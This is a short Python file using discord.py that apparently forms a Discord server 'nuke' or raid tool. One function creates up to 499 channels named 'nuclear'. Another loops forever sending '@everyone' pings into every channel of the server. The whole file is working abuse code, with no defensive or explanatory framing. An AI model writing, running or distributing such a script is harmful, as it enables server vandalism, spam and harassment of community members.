
import discord

async def radiation(ctx):
    num = 0
    while True:
        try:
            num+=1
            await ctx.guild.create_text_channel("nuclear")
            print(f"create {num} channels")
            if num == 499:
                break
        except Exception as e:
            print(e)
            break

async def dust(ctx):
    while True:
        for channel in ctx.guild.channels:
            try:

                await channel.send("@everyone")

            except Exception as e:
                print(e)
                break